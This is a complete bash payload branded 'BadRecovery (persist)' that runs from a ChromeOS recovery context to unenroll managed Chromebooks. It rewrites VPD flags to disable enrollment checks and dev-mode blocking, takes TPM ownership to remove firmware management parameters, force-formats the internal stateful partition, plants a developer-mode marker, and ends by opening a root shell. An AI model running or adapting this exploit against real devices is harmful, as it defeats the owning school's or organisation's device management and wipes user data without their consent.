#!/bin/bash

SCRIPT_DATE="[2024-10-01]"

initctl stop ui
pkill -9 frecon
rm -rf /run/frecon
frecon --enable-vt1 --daemon --no-login --enable-vts --pre-create-vts --num-vts=4 --enable-gfx
until [ -e /run/frecon/vt0 ]; do
	sleep 0.1
done
exec </run/frecon/vt0 >/run/frecon/vt0 2>&1
printf "\033]input:off\a"
printf "\033[?25l\033[2J\033[H"
echo "Press CTRL+ALT+F1 if you're seeing this" | tee /run/frecon/vt1 /run/frecon/vt2 >/run/frecon/vt3

dark_output() {
	printf "\033[1;30m"
	"$@"
	printf "\033[0m"
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
				*'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*'name="KERN-B"'*'name="ROOT-B"'*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

block_char=$(printf "\xe2\x96\x88")
echo "Ck9PT08gICBPT08gIE9PT08gIE9PT08gIE9PT09PICBPT09PICBPT08gIE8gICBPIE9PT09PIE9PT08gIE8gICBPCk8gICBPIE8gICBPIE8gICBPIE8gICBPIE8gICAgIE8gICAgIE8gICBPIE8gICBPIE8gICAgIE8gICBPICBPIE8gCk9PT08gIE9PT09PIE8gICBPIE9PT08gIE9PT08gIE8gICAgIE8gICBPIE8gICBPIE9PT08gIE9PT08gICAgTyAgCk8gICBPIE8gICBPIE8gICBPIE8gICBPIE8gICAgIE8gICAgIE8gICBPICBPIE8gIE8gICAgIE8gICBPICAgTyAgCk9PT08gIE8gICBPIE9PT08gIE8gICBPIE9PT09PICBPT09PICBPT08gICAgTyAgIE9PT09PIE8gICBPICAgTyAgCgo=" | base64 -d | sed "s/O/$block_char/g"

echo "Welcome to BadRecovery (persist)"
echo "Script date: $SCRIPT_DATE"
echo "https://github.com/BinBashBanana/badrecovery"
echo ""

echo "Modifying VPD (check_enrollment=0 block_devmode=0)"
vpd -i RW_VPD -s check_enrollment=0 -s block_devmode=0
echo "...$?"

echo "Setting block_devmode=0 in crossystem"
crossystem block_devmode=0
echo "...$?"

echo "Removing FWMP"
cryptohome_out=$(cryptohome --action=get_firmware_management_parameters 2>&1)
cryptohome_code=$?
if [ $cryptohome_code -eq 0 ] && ! echo "$cryptohome_out" | grep -q "Unknown action"; then
	dark_output tpm_manager_client take_ownership
	dark_output cryptohome --action=remove_firmware_management_parameters
	cryptohome_code=$?
else
	cryptohome_code=0
fi
echo "...$?"

WIPE_ERROR=0
INTERNAL_DISK=$(get_largest_cros_blockdev)
if [ -z "$INTERNAL_DISK" ]; then
	WIPE_ERROR=1
	echo "Could not find internal disk. Unable to skip developer mode delay."
else
	echo "Fixing stateful"
	STATEFUL_PART=$(format_part_number "$INTERNAL_DISK" 1)
	dark_output initctl start pre-shutdown
	dark_output chromeos_shutdown
	dark_output chromeos_shutdown
	dark_output umount -A "$STATEFUL_PART"
	if grep -q "^${STATEFUL_PART}\s" /proc/mounts; then
		WIPE_ERROR=1
		echo "Could not unmount stateful. Unable to skip developer mode delay."
	else
		dark_output mkfs.ext4 -F -b 4096 -L H-STATE "$STATEFUL_PART"
		echo "Enabling devmode"
		stateful_mnt=$(mktemp -d)
		mount "$STATEFUL_PART" "$stateful_mnt"
		touch "$stateful_mnt/.developer_mode"
		umount "$stateful_mnt"
		rmdir "$stateful_mnt"
	fi
fi

echo "Device unenrolled."
if [ $WIPE_ERROR -eq 0 ]; then
	echo "Enter recovery mode and switch to developer mode now to skip the delay."
else
	echo "Reset the device by switching into developer mode."
fi

printf "\033]input:on\a\033[?25h"
exec setsid -c bash
